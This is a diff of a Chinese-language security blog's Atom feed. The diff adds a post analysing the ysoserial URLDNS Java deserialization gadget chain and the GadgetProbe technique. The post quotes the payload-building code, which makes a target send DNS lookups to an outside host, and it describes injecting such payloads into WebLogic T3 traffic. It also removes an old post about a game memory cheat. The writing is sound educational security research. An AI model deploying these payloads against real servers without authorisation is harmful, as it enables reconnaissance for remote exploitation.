@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://blog.kaibro.tw/"/>
-  <updated>2020-03-02T12:34:17.915Z</updated>
+  <updated>2020-03-04T14:20:08.481Z</updated>
   <id>http://blog.kaibro.tw/</id>
   
   <author>
@@ -15,11 +15,11 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
-    <title><![CDATA[Java反序列化之CommonCollections1分析]]></title>
+    <title><![CDATA[Java 反序列化之 CommonCollections1 分析]]></title>
     <link href="http://blog.kaibro.tw/2020/02/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonCollections1%E5%88%86%E6%9E%90/"/>
     <id>http://blog.kaibro.tw/2020/02/27/Java反序列化之CommonCollections1分析/</id>
     <published>2020-02-26T18:06:56.000Z</published>
-    <updated>2020-03-02T12:34:17.915Z</updated>
+    <updated>2020-03-04T14:20:08.481Z</updated>
     <content type="html"><![CDATA[<h2 id="u524D_u8A00"><a href="#u524D_u8A00" class="headerlink" title="前言"></a>前言</h2><p>Common Collections 反序列化漏洞歷史在<a href="https://blog.kaibro.tw/2020/02/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BreadObject%E5%88%86%E6%9E%90/">上一篇文章</a>中有稍微提過</p>
 <p>這個漏洞在 2015 年時，對整個 Java 生態系造成不小的影響</p>
 <p>後續也愈來愈多奇形怪狀的 Gadget chain 被大佬們一一挖出來</p>
@@ -191,11 +191,125 @@
   </entry>
   
   <entry>
-    <title><![CDATA[Java反序列化之readObject分析]]></title>
+    <title><![CDATA[Java 反序列化之 URLDNS 與 GadgetProbe]]></title>
+    <link href="http://blog.kaibro.tw/2020/02/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BURLDNS%E8%88%87GadgetProbe/"/>
+    <id>http://blog.kaibro.tw/2020/02/26/Java反序列化之URLDNS與GadgetProbe/</id>
+    <published>2020-02-26T14:03:18.000Z</published>
+    <updated>2020-03-04T14:27:35.429Z</updated>
+    <content type="html"><![CDATA[<h2 id="URLDNS__u5206_u6790"><a href="#URLDNS__u5206_u6790" class="headerlink" title="URLDNS 分析"></a>URLDNS 分析</h2><p>URLDNS 是 ysoserial 工具裡面的一條 gadget chain</p>
+<p>其主要目的是能夠對指定的 URL 發送 DNS Query</p>
+<p>由於它不需要依賴第三方函式庫，原生 JDK 就能夠串起整條 Gadget Chain</p>
+<p>所以一般在測試反序列化時，常會以 URLDNS 是否有發送 DNS 請求來判斷反序列化漏洞存在與否</p>
+<p>尤其在實戰中常遇到嚴苛的網路環境限制，使得 HTTP/HTTPS 無法對外請求，只能透過 DNS 對外發送查詢請求</p>
+<p><br></p>
+<p>今天這篇主要就是來分析 URLDNS gadget chain 背後的原理，以及一些延伸的小應用</p>
+<p>由於 URLDNS gadget chain 概念非常單純，所以非常推薦新手學習 Java 反序列化時，可以先從這個 gadget chain 開始看起</p>
+<p>若直接從 Common Collections 系列或更複雜的利用鍊開始看，會相對來說吃力很多，很容易降低學習的熱情</p>
+<p><br></p>
+<a id="more"></a>
+<p>先從 HashMap 的 readObect 看起:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></div><div class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</div><div class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></div><div class="line">    s.defaultReadObject();</div><div class="line">    reinitialize();</div><div class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</div><div class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Illegal load factor: "</span> +</div><div class="line">                                         loadFactor);</div><div class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></div><div class="line">    <span class="keyword">int</span> mappings = s.readInt(); <span class="comment">// Read number of mappings (size)</span></div><div class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</div><div class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Illegal mappings count: "</span> +</div><div class="line">                                         mappings);</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></div><div class="line">        <span class="comment">// Size the table using given load factor only if within</span></div><div class="line">        <span class="comment">// range of 0.25...4.0</span></div><div class="line">        <span class="keyword">float</span> lf = Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</div><div class="line">        <span class="keyword">float</span> fc = (<span class="keyword">float</span>)mappings / lf + <span class="number">1.0f</span>;</div><div class="line">        <span class="keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</div><div class="line">                   DEFAULT_INITIAL_CAPACITY :</div><div class="line">                   (fc &gt;= MAXIMUM_CAPACITY) ?</div><div class="line">                   MAXIMUM_CAPACITY :</div><div class="line">                   tableSizeFor((<span class="keyword">int</span>)fc));</div><div class="line">        <span class="keyword">float</span> ft = (<span class="keyword">float</span>)cap * lf;</div><div class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</div><div class="line">                     (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</div><div class="line">        <span class="meta">@SuppressWarnings</span>(&#123;<span class="string">"rawtypes"</span>,<span class="string">"unchecked"</span>&#125;)</div><div class="line">            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[cap];</div><div class="line">        table = tab;</div><div class="line"></div><div class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</div><div class="line">            <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</div><div class="line">                K key = (K) s.readObject();</div><div class="line">            <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</div><div class="line">                V value = (V) s.readObject();</div><div class="line">            putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>由於 <code>HashMap</code> 中 Entry 的順序是根據 Key 的 Hash 值來計算並存放的，但是在不同 JVM 中，算出來的 Hash 值有可能不同</p>
+<p>HashMap 為了保持反序列化後物件狀態的一致性，所以重寫了 <code>HashMap.readObject()</code> 方法</p>
+<p>在過程中，重新計算 Key 和 Value 的位置，並填充進新的 HashMap 中，解決了上述的問題</p>
+<p><br></p>
+<p>我們可以注意一下對 Key 做 hash 值計算的部分：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</div></pre></td></tr></table></figure>
+<p>跟進去 <code>hash()</code> 方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> h;</div><div class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>這裡是對傳進來的 Object 呼叫 <code>hashCode()</code> 方法</p>
+<p>而 URLDNS payload 中則選擇使用 <code>java.net.URL</code> 當作目標傳入</p>
+<p>所以來追進 <code>java.net.URL.hashCode()</code> 方法瞧瞧：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</div><div class="line">        <span class="keyword">return</span> hashCode;</div><div class="line"></div><div class="line">    hashCode = handler.hashCode(<span class="keyword">this</span>);</div><div class="line">    <span class="keyword">return</span> hashCode;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>當 <code>hashCode</code> 屬性等於 <code>-1</code> 時，會去呼叫 <code>handler</code> 的 <code>hashCode()</code> 方法</p>
+<p>當 <code>handler</code> 為 <code>URLStreamHandler</code> 類別或其子類時，該 <code>hashCode()</code> 方法會去做 DNS 查詢:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">(URL u)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> h = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="comment">// Generate the protocol part.</span></div><div class="line">    String protocol = u.getProtocol();</div><div class="line">    <span class="keyword">if</span> (protocol != <span class="keyword">null</span>)</div><div class="line">        h += protocol.hashCode();</div><div class="line"></div><div class="line">    <span class="comment">// Generate the host part.</span></div><div class="line">    InetAddress addr = getHostAddress(u);</div><div class="line">    <span class="keyword">if</span> (addr != <span class="keyword">null</span>) &#123;</div><div class="line">        h += addr.hashCode();</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        String host = u.getHost();</div><div class="line">        <span class="keyword">if</span> (host != <span class="keyword">null</span>)</div><div class="line">            h += host.toLowerCase().hashCode();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// Generate the file part.</span></div><div class="line">    String file = u.getFile();</div><div class="line">    <span class="keyword">if</span> (file != <span class="keyword">null</span>)</div><div class="line">        h += file.hashCode();</div><div class="line"></div><div class="line">    <span class="comment">// Generate the port part.</span></div><div class="line">    <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)</div><div class="line">        h += getDefaultPort();</div><div class="line">    <span class="keyword">else</span></div><div class="line">        h += u.getPort();</div><div class="line"></div><div class="line">    <span class="comment">// Generate the ref part.</span></div><div class="line">    String ref = u.getRef();</div><div class="line">    <span class="keyword">if</span> (ref != <span class="keyword">null</span>)</div><div class="line">        h += ref.hashCode();</div><div class="line"></div><div class="line">    <span class="keyword">return</span> h;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><code>getHostAddress()</code> 方法會對傳入的 url 做 DNS 查詢</p>
+<p><br></p>
+<p>接著來看看 ysoserial 中 URLDNS Payload 生成的方式:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@SuppressWarnings</span>(&#123; <span class="string">"rawtypes"</span>, <span class="string">"unchecked"</span> &#125;)</div><div class="line"><span class="meta">@PayloadTest</span>(skip = <span class="string">"true"</span>)</div><div class="line"><span class="meta">@Dependencies</span>()</div><div class="line"><span class="meta">@Authors</span>(&#123; Authors.GEBL &#125;)</div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</div><div class="line"></div><div class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line"></div><div class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></div><div class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></div><div class="line">                URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</div><div class="line"></div><div class="line">                HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">// HashMap that will contain the URL</span></div><div class="line">                URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></div><div class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></div><div class="line"></div><div class="line">                Reflections.setFieldValue(u, <span class="string">"hashCode"</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></div><div class="line"></div><div class="line">                <span class="keyword">return</span> ht;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">                PayloadRunner.run(URLDNS.class, args);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="comment">/**</span></div><div class="line">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</div><div class="line">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</div><div class="line">         * using the serialized object.&lt;/p&gt;</div><div class="line">         *</div><div class="line">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</div><div class="line">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</div><div class="line">         * second resolution.&lt;/p&gt;</div><div class="line">         */</div><div class="line">        <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</div><div class="line"></div><div class="line">                <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</div><div class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</div><div class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">                &#125;</div><div class="line">        &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>這裡值得注意的是，它建立了一個 <code>SilentURLStreamHandler</code> 類別，並繼承 <code>URLStreamHandler</code></p>
+<p>這麼做的其中一個原因是 <code>URLStreamHandler</code> 是抽象類別，沒辦法被實例化，所以必須繼承並實作 <code>openConnection()</code> 抽象方法後才能被實例化</p>
+<p>另一個原因是，他為了避免我們在構造 payload 時，過程中就先去做 DNS 查詢，所以把 <code>openConnection()</code> , <code>getHostAddress()</code> 兩個方法都覆寫成直接回傳 null</p>
+<p><br></p>
+<p>看到這邊時，我就產生一個疑問，這樣在反序列化時，目標機器上沒有 <code>SlientURLStreamHandler</code> class，那它背後怎麼處理的呢？</p>
+<p>跟一下 URL class，才發現原來 <code>handler</code> 的屬性是 <code>transient</code></p>
+<p>在<a href="https://blog.kaibro.tw/2020/02/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BreadObject%E5%88%86%E6%9E%90/">前面文章</a>中有講過，<code>transient</code> 的物件是不會被序列化的，所以我們設定的 <code>SilentURLStreamHandler</code> 實例也就不會被序列化到目標機器上</p>
+<p>接著看一下它的 <code>readObject()</code> 怎麼還原 <code>handler</code> 的:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></div><div class="line">         <span class="keyword">throws</span> IOException, ClassNotFoundException</div><div class="line">&#123;</div><div class="line">    s.defaultReadObject();  <span class="comment">// read the fields</span></div><div class="line">    <span class="keyword">if</span> ((handler = getURLStreamHandler(protocol)) == <span class="keyword">null</span>) &#123;</div><div class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"unknown protocol: "</span> + protocol);</div><div class="line">    &#125;</div><div class="line">    ...</div></pre></td></tr></table></figure>
+<p><code>getURLStreamHandler()</code> 方法會去根據 protocol 等資訊去決定返回哪個 handler 做後續處理，所以這裡就跟我們前面那個自定義的 <code>SilentURLStreamHandler</code> 完全無關了</p>
+<p><br></p>
+<p>最後，我們剛剛說 <code>hashCode</code> 要等於 <code>-1</code> 才會去呼叫 <code>handler.hashCode()</code></p>
+<p>但預設 <code>hashCode</code> 不是 -1，所以可以看到 ysoserial 中把 <code>hashCode</code> 設定成 -1:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Reflections.setFieldValue(u, <span class="string">"hashCode"</span>, -<span class="number">1</span>)</div></pre></td></tr></table></figure>
+<p>到此，我們的分析就差不多結束了！</p>
+<p><br></p>
+<p>回顧一下整個流程:</p>
+<p>把構造出來的物件送到目標機器做反序列化</p>
+<p>觸發 <code>HashMap.readObject()</code> 執行</p>
+<p>為了還原 hash table 內容，重新計算 key 的 hash 值，呼叫了 <code>hash()</code> 方法</p>
+<p>接著又呼叫了 <code>key.hashCode()</code></p>
+<p>當 <code>hashCode</code> 屬性為 <code>-1</code> 時，會去呼叫 <code>handler.hashCode()</code></p>
+<p>而 <code>URLStreamHandler</code> 介面的 <code>hashCode()</code> 方法會去呼叫 <code>getHostAddress()</code> 做 DNS 查詢！</p>
+<hr>
+<p><br></p>
+<h2 id="Gadget_Probe"><a href="#Gadget_Probe" class="headerlink" title="Gadget Probe"></a>Gadget Probe</h2><p>近期 github 上面有人分享了 <a href="https://github.com/BishopFox/GadgetProbe" target="_blank" rel="external">GadgetProbe</a> 這個工具</p>
+<p>這個工具能夠透過 URLDNS 的方式，判斷目標機器 classpath 中是否存在某個 class (gadget)</p>
+<p><br></p>
+<p>其背後的原理很簡單，只是在 URLDNS 的基礎之上多加一個判斷的小技巧而已</p>
+<p>簡單說明一下該工具的核心概念:</p>
+<p><br></p>
+<p>如果我們送了一個目標機器不存在的類別實例過去</p>
+<p>那目標機器因為找不到對應的類別，所以程式會噴錯誤，後面的程式邏輯就會直接略過</p>
+<p>所以 gadget probe 的方法就是：</p>
+<p>構造一個場景，讓目標先反序列化我們要判斷的類別實例，然後再緊接著去做 DNS query</p>
+<p>若該類別存在，就會接著發送 DNS 請求</p>
+<p>若該類別不存在，會因為程式錯誤而不發送 DNS 請求</p>
+<p>這樣我們就能透過是否收到 DNS 請求來知道對方機器是否存在某個類別</p>
+<p><br></p>
+<p>實作上有個小細節是，若本地目標類別不存在</p>
+<p>可以透過 <code>javassist</code> 去建立一個空的 class</p>
+<p>這樣我們就能生成對應的類別實例去做序列化了</p>
+<p><br></p>
+<p>再補充一個小東西:</p>
+<p>Weblogic 有實作自己的 RMI protocol，也就是 T3 protocol</p>
+<p>T3 protocol 的格式有點小複雜，這裡就不細講</p>
+<p>但這裡重點是，其中有一部分內容是一般 Java Serialization Object 的格式，也就是 <code>ac ed 00 05</code> 的格式</p>
+<p><img src="https://i.imgur.com/XKUggli.png" alt=""></p>
+<p>所以我們可以把 ysoserial 產出來的 payload 拿來直接置換掉這個部分，並把長度欄位改一下就能直接使用了，真棒!</p>
+<p>前面講到的 gadget probe 也能用一樣的方法在 Weblogic 上實作出來</p>
+<p>所以我就把原本的 gadget probe 移植成 weblogic 能用的版本</p>
+<p>有興趣的讀者可以參考我的 <a href="https://github.com/w181496/weblogic-gadget-probe" target="_blank" rel="external">github repo</a></p>
+<p>(目前只有測試單一版本 weblogic 可以 work，有可能在其他版本或不同環境會失敗，所以有問題歡迎發issue或送PR~)</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<h2 id="URLDNS__u5206_u6790"><a href="#URLDNS__u5206_u6790" class="headerlink" title="URLDNS 分析"></a>URLDNS 分析</h2><p>URLDNS 是 ysoserial 工具裡面的一條 gadget chain</p>
+<p>其主要目的是能夠對指定的 URL 發送 DNS Query</p>
+<p>由於它不需要依賴第三方函式庫，原生 JDK 就能夠串起整條 Gadget Chain</p>
+<p>所以一般在測試反序列化時，常會以 URLDNS 是否有發送 DNS 請求來判斷反序列化漏洞存在與否</p>
+<p>尤其在實戰中常遇到嚴苛的網路環境限制，使得 HTTP/HTTPS 無法對外請求，只能透過 DNS 對外發送查詢請求</p>
+<p><br></p>
+<p>今天這篇主要就是來分析 URLDNS gadget chain 背後的原理，以及一些延伸的小應用</p>
+<p>由於 URLDNS gadget chain 概念非常單純，所以非常推薦新手學習 Java 反序列化時，可以先從這個 gadget chain 開始看起</p>
+<p>若直接從 Common Collections 系列或更複雜的利用鍊開始看，會相對來說吃力很多，很容易降低學習的熱情</p>
+<p><br></p>]]>
+    
+    </summary>
+    
+      <category term="筆記" scheme="http://blog.kaibro.tw/tags/%E7%AD%86%E8%A8%98/"/>
+    
+      <category term="Web" scheme="http://blog.kaibro.tw/tags/Web/"/>
+    
+      <category term="Java" scheme="http://blog.kaibro.tw/tags/Java/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[Java 反序列化之 readObject 分析]]></title>
     <link href="http://blog.kaibro.tw/2020/02/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BreadObject%E5%88%86%E6%9E%90/"/>
     <id>http://blog.kaibro.tw/2020/02/23/Java反序列化之readObject分析/</id>
     <published>2020-02-23T11:11:22.000Z</published>
-    <updated>2020-03-03T03:37:00.859Z</updated>
+    <updated>2020-03-04T14:19:58.593Z</updated>
     <content type="html"><![CDATA[<h2 id="u524D_u8A00"><a href="#u524D_u8A00" class="headerlink" title="前言"></a>前言</h2><p>近期上班有點忙，沒有太多空閒時間能學新東西</p>
 <p>剛好前陣子蠻常遇到 java 反序列化，就用下班後的零碎時間稍微小跟了一下 <code>readObject()</code> 底層流程</p>
 <p>雖然都是萬年老梗內容，但還是順手筆記一下追 code 的過程</p>
@@ -3922,90 +4036,6 @@
     <summary type="html">
     <![CDATA[<p>此篇文章為我在研究利用車載IMU判斷行進方向並預防事故的一些技術資料整理及個人理解。<br>可能在學術上不是很嚴謹，也有可能有地方有錯誤。<br>名詞定義上也可能和其他學術論文不同。</p>
 <h2 id="u74B0_u5883"><a href="#u74B0_u5883" class="headerlink" title="環境"></a>環境</h2><p><strong><em> IMU(Inertial measurement unit): 慣性測量單元 </em></strong><br> IMU包含加速度計、磁力計、陀螺儀等sensor<br> 而IMU被包進後照鏡中，掛在車子上<br> 目的是希望車子行進時，可以計算出車子的方向或是其他資訊來幫助後續處理</p>]]>
-    
-    </summary>
-    
-      <category term="筆記" scheme="http://blog.kaibro.tw/tags/%E7%AD%86%E8%A8%98/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[小朋友下樓梯輔助程式]]></title>
-    <link href="http://blog.kaibro.tw/2016/11/14/%E5%B0%8F%E6%9C%8B%E5%8F%8B%E4%B8%8B%E6%A8%93%E6%A2%AF%E8%BC%94%E5%8A%A9%E7%A8%8B%E5%BC%8F/"/>
-    <id>http://blog.kaibro.tw/2016/11/14/小朋友下樓梯輔助程式/</id>
-    <published>2016-11-14T14:01:30.000Z</published>
-    <updated>2016-11-14T15:03:39.000Z</updated>
-    <content type="html"><![CDATA[<h2 id="u5C0F_u670B_u53CB_u4E0B_u6A13_u68AF_u662F_u5565_uFF1F"><a href="#u5C0F_u670B_u53CB_u4E0B_u6A13_u68AF_u662F_u5565_uFF1F" class="headerlink" title="小朋友下樓梯是啥？"></a>小朋友下樓梯是啥？</h2><p>它不僅是一個很狂的小遊戲</p>
-<p>它更代表了我們的童年回憶</p>
-<p><br><br><img src="/images/pic7.png" alt="圖7"></p>
-<a id="more"></a>
-<p><br><br><br></p>
-<h2 id="u8F14_u52A9_u7A0B_u5F0F"><a href="#u8F14_u52A9_u7A0B_u5F0F" class="headerlink" title="輔助程式"></a>輔助程式</h2><p>其實就是外掛</p>
-<p>這篇紀錄一下怎寫出這個糞game的外掛(記憶體外掛)</p>
-<p>沒啥太多技術含量</p>
-<p><br></p>
-<p>首先</p>
-<p>先開個Cheat Engine搜一下</p>
-<p>這遊戲最基本的改法就是修改血量</p>
-<p><br></p>
-<p>一開始搜滿血是12格</p>
-<p>讓他自殘幾次搜一下</p>
-<p>就能找到血量值的記憶體位址<br><br><br>為了避免每次重開遊戲都要找一次</p>
-<p>我們得找出人物屬性的基址(Base address)<br><br><br>通常人物屬性都是一條陣列，假設基址是0x1bd2</p>
-<p>並且我們知道血量的偏移是0x04</p>
-<p>那血量大致上就可推算是[[0x1bd2]+0x04]<br><br><br>下面介紹一下找基址的一種方法：</p>
-<p>首先找出血量位址後</p>
-<p>點選Find out what writes to this address</p>
-<p><img src="/images/pic1.png" alt="圖1"></p>
-<p>會跳出一個視窗 此時繼續遊戲再自殘一下</p>
-<p>這個視窗會把寫入到這個位址的opcode列出來 相當方便<br><br><br><img src="/images/pic2.png" alt="圖2"></p>
-<p>如此一來 就能幫助我們找到人物屬性陣列的位址</p>
-<p><img src="/images/pic3.png" alt="圖3"></p>
-<p>但這還不是基址 [人物陣列基址] = 人物陣列的位址<br><br><br>我們把這個位址拿去搜一下 就能找到哪個位址(基址)存放這個值</p>
-<p><img src="/images/pic4.png" alt="圖4"></p>
-<p>有了基址就能找各種屬性的偏移(offset)</p>
-<p>因為人物屬性通常是條陣列</p>
-<p>就可以亂try偏移去找一些神奇的屬性(x,y座標 目前階梯數等等)</p>
-<p>也許就可以開發出超酷炫的功能</p>
-<p><br></p>
-<h2 id="u958B_u59CB_u5BEB_u5916_u639B"><a href="#u958B_u59CB_u5BEB_u5916_u639B" class="headerlink" title="開始寫外掛"></a>開始寫外掛</h2><p>前面只教怎麼開發屬性和找基址</p>
-<p>這裏正式介紹一下怎麼實作我們想要的功能</p>
-<p>這裏我用C#來寫</p>
-<p>下面會用到幾個函數：</p>
-<ol>
-<li><p>ReadProcessMemory</p>
-</li>
-<li><p>WriteProcessMemory</p>
-</li>
-<li><p>OpenProcess<br><br><br>C#要調用Win32 api可以這樣子寫：</p>
-</li>
-</ol>
-<p><img src="/images/pic5.png" alt="圖5"></p>
-<p><br></p>
-<p>人物基址0x0018FD9C 血量偏移0x1170</p>
-<p>則血量值即為[[0x0018FD9C]+0x1170]</p>
-<p>程式中讀血量寫起來⼤概像這樣：</p>
-<p><img src="/images/pic6.png" alt="圖6"></p>
-<p><br></p>
-<p>而WriteProcessMemory可以寫入值到記憶體中</p>
-<p>故可以簡單達到血量控制的效果！</p>
-<p>當然也可以控制階層數、人物座標等</p>
-<p><br></p>
-<p>當然還能做出一些更炫砲的功能</p>
-<p>例如….滑鼠走路！！</p>
-<p>方法：抓滑鼠相對於遊戲視窗的座標，Timer定時設定角色座標</p>
-<p>Demo影片:<br><a href="https://drive.google.com/file/d/0B0u00oV7NdOiRWtSSWhvQVZGRHc/view?usp=sharing" target="_blank" rel="external">https://drive.google.com/file/d/0B0u00oV7NdOiRWtSSWhvQVZGRHc/view?usp=sharing</a></p>
-<p><br></p>
-<p>再來個沒啥用的功能…反重力</p>
